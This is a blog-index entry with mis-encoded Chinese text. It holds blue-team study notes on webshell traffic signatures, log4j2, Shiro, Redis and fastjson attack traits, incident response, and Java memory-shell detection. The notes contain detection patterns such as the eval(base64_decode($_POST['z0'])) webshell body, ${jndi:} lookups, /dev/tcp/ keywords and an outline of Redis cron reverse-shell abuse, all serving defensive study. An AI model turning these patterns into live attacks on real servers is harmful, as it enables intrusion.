[{"title":"hvvçŸ¥è¯†ç‚¹","path":"/2025/03/26/work/æŠ¤ç½‘æ€»ç»“/","content":"Webshellå·¥å…·æµé‡ç‰¹å¾ï¼Ÿå†°èï¼ˆBehinderï¼‰4.0è¯·æ±‚ç‰¹å¾ï¼š Headerï¼šå¿…å« **Cookie: PHPSESSID&#x3D;â€¦**ï¼ˆPHP ç‰ˆæœ¬ï¼‰æˆ–åŠ¨æ€å¯†é’¥å¤´ï¼ˆå¦‚ X-Auth-Keyï¼‰ã€‚ Bodyï¼šAES åŠ å¯†ï¼Œé•¿åº¦å¯¹é½ 16 å­—èŠ‚ï¼Œé€šå¸¸ä¼´éš hex ç¼–ç çš„äºŒè¿›åˆ¶æ•°æ®ã€‚ URLï¼šè·¯å¾„éšæœºåŒ–ï¼ˆå¦‚ &#x2F;api&#x2F;v1&#x2F;uploadï¼‰ï¼Œä½†å‚æ•°åä¸ºå›ºå®š _0xâ€¦ æ ¼å¼ï¼ˆå¦‚ **_0x1a2b&#x3D;â€¦**ï¼‰ã€‚ å“åº”ç‰¹å¾ï¼š çŠ¶æ€ç  200ï¼Œè¿”å›æ•°æ®ä¸º AES åŠ å¯†åçš„äºŒè¿›åˆ¶æµï¼Œè§£å¯†åå« -&gt;| å’Œ |&lt;- åˆ†éš”ç¬¦ã€‚ å“¥æ–¯æ‹‰ï¼ˆGodzillaï¼‰1.6è¯·æ±‚ç‰¹å¾ï¼š Headerï¼šContent-Type: application&#x2F;octet-stream æˆ–è‡ªå®šä¹‰ MIME ç±»å‹ã€‚ Bodyï¼šXOR åŠ å¯† + è‡ªå®šä¹‰å¡«å……ï¼Œé¦–å­—èŠ‚ä¸ºå¯†é’¥é•¿åº¦æ ‡è¯†ï¼ˆå¦‚ 0x10 è¡¨ç¤º 16 å­—èŠ‚å¯†é’¥ï¼‰ã€‚ URLï¼šè·¯å¾„ä¼ªè£…ä¸ºé™æ€èµ„æºï¼ˆå¦‚ &#x2F;images&#x2F;logo.pngï¼‰ï¼Œå‚æ•°åéšæœºä½†æ ¼å¼ä¸º _&#x3D;timestampã€‚ å“åº”ç‰¹å¾ï¼š è¿”å›æ•°æ®å« key å­—æ®µç”¨äºåŠ¨æ€å¯†é’¥äº¤æ¢ï¼Œè§£å¯†ååŒ…å« godzilla å…³é”®å­—ã€‚ èšå‰‘ï¼ˆAntSwordï¼‰2.8è¯·æ±‚ç‰¹å¾ï¼š Headerï¼šé»˜è®¤ User-Agent: AntSword&#x2F;v2.1ï¼ˆå¯ä¿®æ”¹ï¼Œä½†ä½æƒé™ç”¨æˆ·å¯èƒ½ä¿ç•™ï¼‰ã€‚ Bodyï¼šBase64 åµŒå¥—å¼‚æˆ–åŠ å¯†ï¼Œå¸¸è§ @ini_set ç­‰ PHP å‡½æ•°åã€‚ URLï¼šè·¯å¾„åŒ…å« _&#x3D;ant æˆ– cmd&#x3D;whoami ç­‰å‚æ•°ã€‚ å“åº”ç‰¹å¾ï¼š è¿”å›æ•°æ®ä¸º Base64 ç¼–ç ï¼Œè§£å¯†åå« antsuccess æˆ– antoutput æ ‡è¯†ã€‚ èœåˆ€ï¼ˆChinaChopperï¼‰2023 é­”æ”¹ç‰ˆè¯·æ±‚ç‰¹å¾ï¼š Headerï¼šAccept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, *&#x2F;*; q&#x3D;.2ï¼ˆç»å…¸ç‰¹å¾ï¼‰ã€‚ Bodyï¼ševal(base64_decode($_POST[â€˜z0â€™])) ç»“æ„ï¼Œå‚æ•°åå›ºå®šï¼ˆå¦‚ z0, z1ï¼‰ã€‚ URLï¼šè·¯å¾„ç®€çŸ­ï¼ˆå¦‚ &#x2F;admin.phpï¼‰ï¼Œå‚æ•°å€¼é•¿åº¦å›ºå®šä¸º 16 å€æ•°ã€‚ å“åº”ç‰¹å¾ï¼š è¿”å›æ˜æ–‡ OK æˆ–åŠ å¯†åçš„ %00 å¡«å……æ•°æ®ã€‚ ç‰¹å¾æ€»ç»“ï¼š å·¥å…· æ ¸å¿ƒæ ‡è¯† æ£€æµ‹éš¾åº¦ å†°è åŠ¨æ€å¯†é’¥å¤´ + AES åŠ å¯†æµ â˜…â˜…â˜…â˜…â˜† å“¥æ–¯æ‹‰ XOR å¯†é’¥é•¿åº¦æ ‡è¯† + å¤šåè®®æ’ä»¶ â˜…â˜…â˜…â˜†â˜† èšå‰‘ Base64 åµŒå¥—å¼‚æˆ– + antsuccess å…³é”®å­— â˜…â˜…â˜†â˜†â˜† èœåˆ€ eval(base64_decode) + å›ºå®šå‚æ•°å â˜…â˜†â˜†â˜†â˜† æ¼æ´æµé‡ç‰¹å¾log4j2 æµé‡ç‰¹å¾è¯¥æ¼æ´ä¸»è¦æ˜¯ç”±äºæ—¥å¿—åœ¨æ‰“å°æ—¶å½“é‡åˆ°$&#123;åï¼Œä»¥:å·ä½œä¸ºåˆ†å‰²ï¼Œå°†è¡¨è¾¾å¼å†…å®¹åˆ†å‰²æˆä¸¤éƒ¨åˆ†ï¼Œå‰é¢ä¸€éƒ¨åˆ†prefixï¼Œåé¢éƒ¨åˆ†ä½œä¸ºkeyï¼Œç„¶åé€šè¿‡prefixå»æ‰¾å¯¹åº”çš„lookupï¼Œé€šè¿‡å¯¹åº”çš„lookupå®ä¾‹è°ƒç”¨lookupæ–¹æ³•ï¼Œæœ€åå°†keyä½œä¸ºå‚æ•°å¸¦å…¥æ‰§è¡Œï¼Œå¼•å‘è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ å¼ºç‰¹å¾ï¼š æ”»å‡»è€…å‘é€çš„æ•°æ®åŒ…ä¸­å¯èƒ½å­˜åœ¨${jndi:}å­—æ · jndiæ³¨å…¥,å¯ä»¥ä¸æ˜¯jndi,jndiæœ‰å¯èƒ½è¢«æ‹¼æ¥,ä½†æ˜¯ä¸€å®šæœ‰${},ä¸€èˆ¬é€šè¿‡ldapè¿œç¨‹åŠ è½½classæ–‡ä»¶ æœ‰æ—¶ä¼šå‡ºç°åœ¨uaå¤´,ä¸åœ¨è¯·æ±‚ä½“ tomcat8080 è¿œç¨‹ä»£ç æ‰§è¡Œã€waråé—¨æ–‡ä»¶éƒ¨ç½² JBoss ååºåˆ—åŒ–æ¼æ´ã€waråé—¨æ–‡ä»¶éƒ¨ç½² IISPUTæ¼æ´ã€çŸ­æ–‡ä»¶åçŒœè§£ã€è¿œç¨‹ä»£ç æ‰§è¡Œã€è§£ææ¼æ´ Apacheè§£ææ¼æ´ã€ç›®å½•éå† Nginx æ–‡ä»¶è§£æã€ç›®å½•éå†ã€CRLFæ³¨å…¥ã€ç›®å½•ç©¿è¶Š weblogicååºåˆ—åŒ–æ¼æ´SSRFä»»æ„æ–‡ä»¶ä¸Šä¼ waråé—¨æ–‡ä»¶éƒ¨ç½² ssrfæ¼æ´ç‰¹å¾ ä¼šå‡ºç°ç‰¹å¾å…³é”®è¯ crontab &#x2F;dev&#x2F;tcp&#x2F; æå–çš„è§„åˆ™å­—æ®µä¸ºï¼šhttp_client_body ï¼Œæå–çš„æ—¶å€™ï¼Œè¿™ä¸ªå…³é”®å­—å¯ä»¥ç”¨hexæ¥æå–ã€‚ shiroShiro é»˜è®¤ä½¿ç”¨äº† CookieRememberMeManagerï¼Œå…¶å¤„ç† cookie çš„æµç¨‹æ˜¯ï¼šå¾—åˆ° rememberMe çš„ cookie å€¼â€“&gt;Base64 è§£ç â€“&gt;AES è§£å¯†â€“&gt; ååºåˆ—åŒ–ã€‚ç„¶è€Œ AES çš„å¯†é’¥æ˜¯ç¡¬ç¼–ç çš„ï¼Œå¯†é’¥æ³„æ¼çš„æ ¹æœ¬åŸå› æ˜¯å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­éƒ¨åˆ†ä»£ç ç›´æ¥ä½¿ç”¨äº†ç½‘ä¸Šçš„ä¸€äº›å¼€æºçš„é¡¹ç›®ä»£ç ï¼Œå°±å¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„æ•°æ®é€ æˆååºåˆ—åŒ–çš„ RCE æ¼æ´ã€‚ CVE-2016-4437çš„æ”»å‡»æµé‡ç‰¹å¾æœ‰ è¯·æ±‚åŒ…Cookieçš„rememberMeä¸­ä¼šå­˜åœ¨AES+base64åŠ å¯†çš„ä¸€ä¸²javaååºåˆ—åŒ–ä»£ç ã€‚ è¿”å›åŒ…ä¸­å­˜åœ¨base64åŠ å¯†æ•°æ®ï¼Œè¯¥æ•°æ®å¯ä½œä¸ºæ”»å‡»æˆåŠŸçš„åˆ¤å®šæ¡ä»¶ã€‚ shrio550å’Œ721çš„åŒºåˆ«1ã€ä¸»è¦åŒºåˆ«åœ¨äºShiro550ä½¿ç”¨å·²çŸ¥é»˜è®¤å¯†ç ï¼Œåªè¦æœ‰è¶³å¤Ÿçš„å¯†ç ï¼Œä¸éœ€è¦Remember Cookieçš„ã€‚2ã€Shiro721çš„aseåŠ å¯†çš„keyä¸ºç³»ç»Ÿéšæœºç”Ÿæˆï¼Œéœ€è¦åˆ©ç”¨ç™»å½•åçš„rememberMeå»çˆ†ç ´æ­£ç¡®çš„keyå€¼ã€‚åˆ©ç”¨æœ‰æ•ˆçš„RememberMe Cookieä½œä¸ºPadding Oracle Attackçš„å‰ç¼€ï¼Œå†å»æ„é€ ååºåˆ—åŒ–æ”»å‡»ã€‚ redis6379 redisæœªæˆæƒæ¼æ´ï¼š é¦–å…ˆè¿™ä¸ªæ¼æ´çš„å­˜åœ¨éœ€è¦å‰ææ¡ä»¶ 1231ã€å¯¹æ–¹redisè¿œç¨‹è¿æ¥å¼€å¯2ã€å¯¹æ–¹redisæœªè®¾ç½®å¯†ç æˆ–è€…å¯†ç æ³„éœ² è¿™é‡Œæ­£å¸¸ä¼šé€‰æ‹©ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡è®¡åˆ’ä»»åŠ¡è¿›è¡Œåå¼¹ncæˆ–è€…å†™shellï¼Œä¸€ç§æ˜¯å†™ä¸€ä¸ªsshå…¬é’¥è¿›è¡Œæ— å¯†ç sshè¿œç¨‹ç™»å½•ã€‚ ç¬¬ä¸€ç§æ–¹å¼ï¼ŒUbuntuä¸å¤ªè¡Œï¼Œæˆ‘æµ‹è¯•çš„centoså¯ä»¥å®Œæˆï¼Œç¬¬äºŒä¸ªsshå…¬é’¥ï¼Œéœ€è¦æˆ‘ä»¬åœ¨æ”»å‡»çš„æœºå™¨ä¸Šç”Ÿæˆä¸€ä¸ªsshå…¬é’¥ï¼Œé€šè¿‡rediså†™å…¥è¿›å»ï¼Œè¿™é‡Œå‰ææ˜¯å¯¹æ–¹ä¸»æœºä¸­rootä¸‹æœ‰.sshæ–‡ä»¶å¤¹ã€‚ fastjsonä½¿ç”¨äº†ä¼ªåè®®ï¼Œååºåˆ—åŒ– a. é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ChatGPTå¯¹å¸¸è§çš„å‡ ç§ä¼ªåè®®çš„è§£é‡Šï¼š â…°. JNDIä¼ªåè®®ï¼šå°†ä¸€ä¸ªJavaå¯¹è±¡ç»‘å®šåˆ°ä¸€ä¸ªJNDIä¸Šä¸‹æ–‡ä¸­ï¼Œæ”»å‡»è€… å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„JSONå­—ç¬¦ä¸²ç»‘å®šä¸€ä¸ªæ¶æ„å¯¹è±¡åˆ°JNDIä¸Šä¸‹æ–‡ä¸­ï¼Œä»è€Œåœ¨ååºåˆ—åŒ–æ—¶è¿›è¡Œè¿œç¨‹ä»£ç ã€‚ â…±. Idapä¼ªåè®®ï¼šå°†ä¸€ä¸ªJavaå¯¹è±¡ç»‘å®šåœ¨Idapç›®å½•ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„JSONå­—ç¬¦ä¸²ï¼Œç»‘å®šä¸€ä¸ªæ¶æ„å¯¹è±¡åˆ°LDAPç›®å½•ä¸­ï¼Œä»è€Œæ‰§è¡Œååºåˆ—åŒ–ä»£ç ã€‚ â…². Rmiä¼ªåè®®ï¼šè¯¥åè®®é€šè¿‡è¿œç¨‹è°ƒç”¨Java RmiæœåŠ¡ï¼Œæ”»å‡»è€… å¯ä»¥é€šè¿‡ æ„é€ Jsonå­—ç¬¦ä¸²ï¼Œè°ƒç”¨ä¸€ä¸ªæ¶æ„çš„RMIæœåŠ¡ï¼Œä»è€Œåœ¨ååºåˆ—åŒ–ä¸­æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚ b. ä¸Šè¿°ä¸‰ç§åè®®äº†è§£å³å¯ï¼Œfastjsonä½¿ç”¨äº†Rmiå’ŒIdapåè®® c. è°ƒç”¨çš„æ˜¯JSON.parseObject(json,User.class)å‡½æ•° 1ï¼ŒæŸ¥çœ‹ç½‘ç«™æºä»£ç æœç´¢å…³é”®è¯ã€‚ 2ï¼Œå¼€å‘è€…å·¥å…·ï¼ŒæŸ¥çœ‹è¯·æ±‚ä»£ç æ˜¯å¦å­˜åœ¨â€com.alibaba.fastjsonæˆ–è€…fastjson åº”æ€¥æµç¨‹ æ”¶é›†ä¿¡æ¯ï¼šæ”¶é›†å®¢æˆ·ä¿¡æ¯å’Œä¸­æ¯’ä¸»æœºä¿¡æ¯ï¼ŒåŒ…æ‹¬æ ·æœ¬ åˆ¤æ–­ç±»å‹ï¼šåˆ¤æ–­æ˜¯å¦æ˜¯å®‰å…¨äº‹ä»¶ï¼Œä½•ç§å®‰å…¨äº‹ä»¶ï¼Œå‹’ç´¢ã€æŒ–çŸ¿ã€æ–­ç½‘ã€DoS ç­‰ç­‰ æŠ‘åˆ¶èŒƒå›´ï¼šéš”ç¦»ä½¿å—å®³é¢ä¸ç»§ç»­æ‰©å¤§ï¼ˆåšå¥½éš”ç¦»ï¼‰ æ·±å…¥åˆ†æï¼šæ—¥å¿—åˆ†æã€è¿›ç¨‹åˆ†æã€å¯åŠ¨é¡¹åˆ†æã€æ ·æœ¬åˆ†ææ–¹ä¾¿åæœŸæº¯æº æ¸…ç†å¤„ç½®ï¼šæ€æ‰è¿›ç¨‹ï¼Œåˆ é™¤æ–‡ä»¶ï¼Œæ‰“è¡¥ä¸ï¼Œåˆ é™¤å¼‚å¸¸ç³»ç»ŸæœåŠ¡ï¼Œæ¸…é™¤åé—¨è´¦å·é˜²æ­¢äº‹ä»¶æ‰©å¤§ï¼Œå¤„ç†å®Œæ¯•åæ¢å¤ç”Ÿäº§ äº§å‡ºæŠ¥å‘Šï¼šæ•´ç†å¹¶è¾“å‡ºå®Œæ•´çš„å®‰å…¨äº‹ä»¶æŠ¥å‘Š å·¥å…·ProcessHacker åŠŸèƒ½ï¼šProcessHacker æ˜¯ä¸€æ¬¾ä¸é”™çš„è¿›ç¨‹åˆ†æå·¥å…·ï¼Œå¯æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿›ç¨‹åŠ è½½çš„ dllã€è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ã€è¿›ç¨‹è¯»å†™çš„æ³¨å†Œè¡¨â€¦â€¦ï¼Œä¹Ÿå¯ä»¥å°†ç‰¹å®šè¿›ç¨‹çš„å†…å­˜ç©ºé—´ Dump åˆ°æœ¬åœ°ï¼Œæ­¤å¤–è¿˜å¯ä»¥æŸ¥çœ‹ç½‘ç»œè¿æ¥ã€‚ ProcessExplorer åŠŸèƒ½ï¼šProcessExplorer æ˜¯ä¸€æ¬¾ä¸é”™çš„è¿›ç¨‹åˆ†æå·¥å…·ï¼Œå¾®è½¯å®˜æ–¹æ¨èå·¥å…·ï¼Œç¨³å®šæ€§å’Œå…¼å®¹æ€§ç›¸å¯¹ä¸é”™ã€‚å¯æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶åŠ è½½çš„ dllã€åˆ›å»ºçš„çº¿ç¨‹ã€ç½‘ç»œè¿æ¥â€¦â€¦ï¼ŒåŒæ ·å¯ä»¥ Dump å‡ºè¿›ç¨‹çš„å†…å­˜ç©ºé—´åˆ°æœ¬åœ°ã€‚ ProcessMonitor åŠŸèƒ½ï¼šProcessMonitor æ˜¯ä¸€æ¬¾å®æ—¶åˆ·æ–°çš„è¿›ç¨‹ä¿¡æ¯ç›‘æ§å·¥å…·ï¼Œå¾®è½¯å®˜æ–¹æ¨èå·¥å…·ï¼Œç¨³å®šæ€§å’Œå…¼å®¹æ€§ä¹Ÿæ˜¯ç›¸å¯¹å‡ºè‰²ã€‚å±•ç¤ºçš„ä¿¡æ¯å¾ˆå…¨é¢ï¼Œä¸”æ¯ä¸€ä¸ªæ‰“å¼€çš„å¥æŸ„ã€æ³¨å†Œè¡¨ã€ç½‘ç»œè¿æ¥â€¦â€¦ éƒ½ä¸å…·ä½“çš„è¿›ç¨‹å…³è”èµ·æ¥ã€‚ PCHunter åŠŸèƒ½ï¼šXueTr çš„å¢å¼ºç‰ˆï¼ŒåŠŸèƒ½å’Œ XueTr å·®ä¸å¤šï¼Œå¯å‚è€ƒä¸Šå›¾ã€‚æ¨èæ›´å¤šä½¿ç”¨ PCHunterï¼Œå‡å°‘å‡ºæ•…éšœçš„æ¦‚ç‡ã€‚ Wireshark åŠŸèƒ½ï¼šWireshark æ˜¯ä¸€æ¬¾å¸¸ç”¨çš„ç½‘ç»œæŠ“åŒ…å·¥å…·ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç”¨äºæµé‡åˆ†æã€‚ AutoRuns åŠŸèƒ½ï¼šä¸€æ¬¾ä¸é”™çš„å¯åŠ¨é¡¹åˆ†æå·¥å…·ï¼Œå¾®è½¯å®˜æ–¹æ¨èã€‚åªè¦æ¶‰åŠåˆ°å¯åŠ¨é¡¹ç›¸å…³çš„ä¿¡æ¯ï¼Œäº‹æ— å·¨ç»†ï¼Œé€šé€šéƒ½å¯ä»¥æŸ¥è¯¢å¾—åˆ°ï¼Œéå¸¸æ–¹ä¾¿æ‰¾åˆ°ç—…æ¯’çš„å¯åŠ¨é¡¹ã€‚ FastIR åŠŸèƒ½ï¼šæ”¶é›†æ“ä½œç³»ç»Ÿçš„å…³é”®æ—¥å¿—ã€å…³é”®ä¿¡æ¯ï¼Œæ–¹ä¾¿åç»­å–è¯å’Œæ’æŸ¥åˆ†æã€‚ Hash åŠŸèƒ½ï¼šæ–‡ä»¶ hash è®¡ç®—å·¥å…·ï¼Œå¯è®¡ç®—æ–‡ä»¶ MD5ã€SHA1ã€CRC å€¼ï¼Œå¯ç”¨äºè¾…åŠ©åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¢«ç¯¡æ”¹ï¼Œæˆ–è€…ä½¿ç”¨å“ˆå¸Œå€¼åˆ°å¨èƒæƒ…æŠ¥ç½‘ç«™æŸ¥çœ‹æ˜¯å¦ä¸ºæ¶æ„æ–‡ä»¶ã€‚ å¦‚ä½•æ£€æµ‹ Java å†…å­˜é©¬å†…å­˜é©¬æ’æŸ¥æ€è·¯ å…ˆæŸ¥çœ‹æ£€æŸ¥æœåŠ¡å™¨webæ—¥å¿—ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘çš„webè®¿é—®æ—¥å¿—ï¼Œæ¯”å¦‚è¯´filteræˆ–è€…listenerç±»å‹çš„å†…å­˜é©¬ï¼Œä¼šæœ‰å¤§é‡urlè¯·æ±‚è·¯å¾„ç›¸åŒå‚æ•°ä¸åŒçš„ï¼Œæˆ–è€…é¡µé¢ä¸å­˜åœ¨ä½†æ˜¯è¿”å›200çš„è¯·æ±‚ã€‚ å¦‚åœ¨webæ—¥å¿—ä¸­å¹¶æœªå‘ç°å¼‚å¸¸ï¼Œå¯ä»¥æ’æŸ¥æ˜¯å¦ä¸ºä¸­é—´ä»¶æ¼æ´å¯¼è‡´ä»£ç æ‰§è¡Œæ³¨å…¥å†…å­˜é©¬ï¼Œæ’æŸ¥ä¸­é—´ä»¶çš„error.logæ—¥å¿—æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘çš„æŠ¥é”™ï¼Œæ ¹æ®æ³¨å…¥æ—¶é—´å’Œæ–¹æ³•æ ¹æ®ä¸šåŠ¡ä½¿ç”¨çš„ç»„ä»¶æ’æŸ¥æ˜¯å¦å¯èƒ½å­˜åœ¨javaä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠæ˜¯å¦å­˜åœ¨è¿‡webshellï¼Œæ’æŸ¥æ¡†æ¶æ¼æ´ï¼Œååºåˆ—åŒ–æ¼æ´ã€‚ æŸ¥çœ‹æ˜¯å¦æœ‰ç±»ä¼¼å“¥æ–¯æ‹‰ã€å†°èç‰¹å¾çš„urlè¯·æ±‚ï¼Œå“¥æ–¯æ‹‰å’Œå†°èçš„å†…å­˜é©¬æ³¨å…¥æµé‡ç‰¹å¾ä¸æ™®é€šwebshellçš„æµé‡ç‰¹å¾åŸºæœ¬å»åˆã€‚ é€šè¿‡æŸ¥æ‰¾è¿”å›200çš„urlè·¯å¾„å¯¹æ¯”webç›®å½•ä¸‹æ˜¯å¦çœŸå®å­˜åœ¨æ–‡ä»¶ï¼Œå¦‚ä¸å­˜åœ¨å¤§æ¦‚ç‡ä¸ºå†…å­˜é©¬ã€‚ ç®€è¿°ï¼š é¦–å…ˆæ’æŸ¥webæ—¥å¿—æ–‡ä»¶ï¼Œæ—¥å¿—ä¸­æ²¡æœ‰æ’æŸ¥ä¸­é—´ä»¶æ¼æ´å¯¼è‡´çš„ï¼Œæ’æŸ¥ä¸­é—´ä»¶çš„error.logæ—¥å¿—ï¼ŒæŸ¥çœ‹æ˜¯å¦åˆå“¥æ–¯æ‹‰å’Œå†°èæµé‡ç‰¹å¾ï¼ŒæŸ¥çœ‹è¿”å›200çš„urlè·¯å¾„æ˜¯å¦åœ¨webä¸‹çœŸå®å­˜åœ¨ï¼Œä¸å­˜åœ¨å¤§æ¦‚ç‡æ˜¯å†…å­˜é©¬ã€‚ å†…å­˜é©¬ç‰¹å¾çš„è¯†åˆ«é€šè¿‡åˆ†æç½‘ç»œæµé‡ï¼Œå¯ä»¥è¯†åˆ«å‡ºæ½œåœ¨çš„å†…å­˜é©¬æ´»åŠ¨ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å¯ç–‘æµé‡ç‰¹å¾ï¼š å¼‚å¸¸è¯·æ±‚è·¯å¾„å’ŒçŠ¶æ€ç  GET è¯·æ±‚ï¼š è®¿é—®ä¸å­˜åœ¨çš„è·¯å¾„ï¼Œä½†è¿”å› 404 çŠ¶æ€ç ï¼ŒåŒæ—¶æºå¸¦å¯ç–‘å‚æ•°ï¼Œä¾‹å¦‚ &#x2F;memshell?cmd&#x3D;calcï¼Œå…¶ä¸­ &#x2F;memshell è·¯ç”±å¹¶ä¸å­˜åœ¨ï¼Œä½†è¯·æ±‚å´å¯èƒ½è¢«æ‰§è¡Œã€‚ POST è¯·æ±‚ï¼š è®¿é—®æ­£å¸¸è·¯å¾„ï¼Œè¿”å› 200 çŠ¶æ€ç ï¼Œä½†è¯·æ±‚ä½“ä¸­åŒ…å«æ¶æ„å‘½ä»¤ï¼Œä¸”å‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œã€‚ç¤ºä¾‹ï¼š æ”»å‡»è€…å¯èƒ½ä¼šå°è¯•é€šè¿‡è®¿é—® &#x2F;shell, &#x2F;cmd, &#x2F;hack, &#x2F;test ç­‰ä¸å­˜åœ¨çš„è·¯å¾„ï¼Œå¹¶æºå¸¦å‚æ•°æ‰§è¡Œå‘½ä»¤ã€‚åŠ¨æ€å˜åŒ–çš„æ•°æ®åŒ…å¤§å°ï¼š å†…å­˜é©¬åœ¨æ‰§è¡Œå‘½ä»¤æˆ–è¿”å›ç»“æœæ—¶ï¼Œä¼šå¯¼è‡´æ•°æ®åŒ…å¤§å°å‘ç”ŸåŠ¨æ€å˜åŒ–ï¼Œè¿™æ˜¯å†…å­˜é©¬æ´»åŠ¨çš„å…¸å‹ç‰¹å¾ã€‚ ç‰¹æ®Šçš„ User-Agent æˆ– Referer å­—æ®µï¼š æ”»å‡»è€…æœ‰æ—¶ä¼šä½¿ç”¨ç‰¹æ®Šçš„ User-Agent æˆ– Referer å­—æ®µæ¥æ ‡è¯†æˆ–æ§åˆ¶å†…å­˜é©¬ã€‚ å¼‚å¸¸çš„å“åº”æ—¶é—´ï¼š å†…å­˜é©¬æ‰§è¡Œå‘½ä»¤å¯èƒ½å¯¼è‡´å“åº”æ—¶é—´å˜é•¿æˆ–ä¸ç¨³å®šã€‚ ä»£ç ç‰¹å¾åˆ†æ é€šè¿‡åˆ†æ Web åº”ç”¨çš„ Class æ–‡ä»¶ã€Jar åŒ…ä»¥åŠè¿è¡Œæ—¶å†…å­˜æ•°æ®ï¼Œå¯ä»¥å‘ç°æ½œåœ¨çš„å†…å­˜é©¬ä»£ç ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å¯ç–‘ä»£ç ç‰¹å¾ï¼š è¿æ¥å¯†ç ï¼š å†…å­˜é©¬é€šå¸¸ä¼šè®¾ç½®è¿æ¥å¯†ç ï¼Œç”¨äºè¿œç¨‹æ§åˆ¶å’Œæ‰§è¡Œå‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œä»£ç ä¸­å¯èƒ½å­˜åœ¨ password, key, token ç­‰å­—ç¬¦ä¸²ï¼Œç”¨äºèº«ä»½éªŒè¯ã€‚ è‡ªå®šä¹‰è·¯ç”±ï¼š å†…å­˜é©¬ä¼šæ³¨å†Œè‡ªå®šä¹‰çš„è·¯ç”±ï¼Œç”¨äºæ¥æ”¶æ”»å‡»è€…çš„æŒ‡ä»¤ã€‚ä¾‹å¦‚ï¼Œä»£ç ä¸­å¯èƒ½å­˜åœ¨ @WebServlet, @RequestMapping ç­‰æ³¨è§£ï¼Œç”¨äºæ˜ å°„ URL åˆ°æ¶æ„ä»£ç ã€‚ åŠ è§£å¯†æ“ä½œï¼š ä¸ºäº†éšè—æ¶æ„ä»£ç å’Œé€šä¿¡å†…å®¹ï¼Œå†…å­˜é©¬é€šå¸¸ä¼šä½¿ç”¨åŠ è§£å¯†ç®—æ³•ï¼Œä¾‹å¦‚ AESã€Base64 ç­‰ã€‚ä»£ç ä¸­å¯èƒ½å­˜åœ¨ javax.crypto, java.util.Base64 ç­‰ç›¸å…³çš„ç±»å’Œæ–¹æ³•ã€‚ æ¶æ„çš„ä»£ç æ‰§è¡Œï¼š å†…å­˜é©¬çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚ä»£ç ä¸­å¯èƒ½å­˜åœ¨ Runtime.getRuntime().exec(), ProcessBuilder ç­‰æ–¹æ³•ï¼Œç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ åŠ¨æ€æ³¨å†Œç»„ä»¶ï¼š å†…å­˜é©¬å¯èƒ½ä¼šåˆ©ç”¨ Java åå°„æœºåˆ¶åŠ¨æ€æ³¨å†Œ Filterã€Servletã€Listener ç­‰ç»„ä»¶ï¼Œä¾‹å¦‚ ClassLoader.defineClass(), Class.forName() ç­‰æ–¹æ³•ã€‚ å¯ç–‘çš„ç±»åå’ŒåŒ…åï¼š å†…å­˜é©¬çš„ç±»åå’ŒåŒ…åé€šå¸¸ä¼šä¼ªè£…æˆæ­£å¸¸çš„ç±»ï¼Œä½†å¯èƒ½åŒ…å«ä¸€äº›å¯ç–‘çš„å…³é”®è¯ï¼Œä¾‹å¦‚ shell, cmd, hack, util ç­‰ã€‚ æŸ¥æ€åŸºäº Java Agent æŠ€æœ¯çš„å†…å­˜é©¬æŸ¥æ€ å‰é¢å·²ç»æåˆ°äº†java agentå¯ä»¥åŠ¨æ€çš„ä¿®æ”¹å­—èŠ‚ç ç”¨æ¥åŠ¨æ€æ³¨å†Œå†…å­˜é©¬ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨è¯¥æŠ€æœ¯å¤„ç†å†…å­˜é©¬ã€‚ å·¥å…·ä¸€ï¼šé€šè¿‡ JSP è„šæœ¬æ‰«æ Java Web Filter&#x2F;Servlet&#x2F;Listener ç±»å‹å†…å­˜é©¬ å·¥å…·åœ°å€ï¼š é€šè¿‡jspè„šæœ¬æ‰«æjava web Filter&#x2F;Servlet&#x2F;Listnerç±»å‹å†…å­˜é©¬ åŸç†ï¼š è¯¥å·¥å…·é€šè¿‡ JSP è„šæœ¬å®ç°ï¼Œåˆ©ç”¨åå°„æœºåˆ¶éå† Tomcat å®¹å™¨ä¸­çš„ Filterã€Servlet å’Œ Listenerï¼Œå¹¶æ£€æŸ¥å®ƒä»¬çš„ ClassLoader æ˜¯å¦ä¸æ­£å¸¸çš„ ClassLoader ä¸€è‡´ã€‚å¦‚æœ ClassLoader ä¸ä¸€è‡´ï¼Œåˆ™å¯èƒ½å­˜åœ¨å†…å­˜é©¬ã€‚ ä½¿ç”¨æ–¹æ³•ï¼š ä¸‹è½½é¡¹ç›®ä¸­çš„ tomcat-memshell-scanner.jsp æ–‡ä»¶ã€‚ å°† tomcat-memshell-scanner.jsp æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ Tomcat æœåŠ¡å™¨çš„ Web åº”ç”¨ç›®å½•ä¸‹ã€‚ é€šè¿‡æµè§ˆå™¨è®¿é—® tomcat-memshell-scanner.jsp æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šhttp://127.0.0.1:8088/FilterShell_war_exploded/tomcat-memshell-scanner.jspã€‚ 